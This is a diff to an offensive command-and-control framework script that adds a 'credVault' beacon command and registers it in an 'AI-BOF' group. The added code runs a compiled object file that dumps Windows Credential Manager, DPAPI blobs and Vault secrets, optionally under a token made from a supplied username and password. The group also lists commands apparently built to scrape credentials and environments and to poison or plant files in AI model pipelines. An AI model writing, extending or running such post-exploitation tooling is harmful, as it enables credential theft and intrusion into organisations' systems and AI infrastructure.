@@ -239,10 +239,28 @@ cmd_sessionBrute.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines)
     ax.execute_alias(id, cmdline, `execute bof "${bof_path}" ${bof_params}`, "sessionBrute " + ip + ":" + port);
 });
 
+// ---------- credVault ----------
+var cmd_credVault = ax.create_command("credVault", "Dump Credential Manager + DPAPI blobs + Vault (OSAI M7 / T1555). -u/-p/-d spawn an interactive token (fixes type-3 network-logon empty credman).", "credVault ;  credVault -f DC01 -u jordan.west -p 'pass' -d megacorpone");
+cmd_credVault.addArgFlagString("-f", "filter", "Case-insensitive substring filter on target/filename (empty = all)", "");
+cmd_credVault.addArgFlagString("-u", "user", "Username for an interactive LogonUser token (optional; loads credman/vault on a type-3 beacon). May be DOMAIN\\user or user@DOMAIN.", "");
+cmd_credVault.addArgFlagString("-p", "pass", "Password for -u (optional)", "");
+cmd_credVault.addArgFlagString("-d", "d", "Domain for -u (optional; empty = local/SAM)", "");
+cmd_credVault.addArgFlagString("-domain", "domain", "Alias for -d", "");
+cmd_credVault.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
+    let filter = parsed_json["filter"] || "";
+    let user = parsed_json["user"] || "";
+    let pass = parsed_json["pass"] || "";
+    let domain = parsed_json["domain"] || parsed_json["d"] || "";
+    let bof_params = ax.bof_pack("cstr,cstr,cstr,cstr", [filter, user, pass, domain]);
+    let bof_path = ax.script_dir() + "_bin/credVault." + ax.arch(id) + ".o";
+    let desc = "credVault" + (filter ? " -f " + filter : "") + (user ? " -u " + user + (domain ? "\\" + domain : "") : "");
+    ax.execute_alias(id, cmdline, `execute bof "${bof_path}" ${bof_params}`, desc);
+});
+
 var group_aibof = ax.create_commands_group("AI-BOF", [
     cmd_aiHunter, cmd_credsMem, cmd_credsLaunch, cmd_envScraper, cmd_aiSvcProbe, cmd_shareWalk,
     cmd_poisonStage, cmd_configDump, cmd_logTail, cmd_kubeHunter,
     cmd_tokenizerSwap, cmd_picklePlant, cmd_gitMine, cmd_vectorExport,
-    cmd_sessionBrute
+    cmd_sessionBrute, cmd_credVault
 ]);
 ax.register_commands_group(group_aibof, ["beacon", "gopher", "NoNameAx"], ["windows"], []);
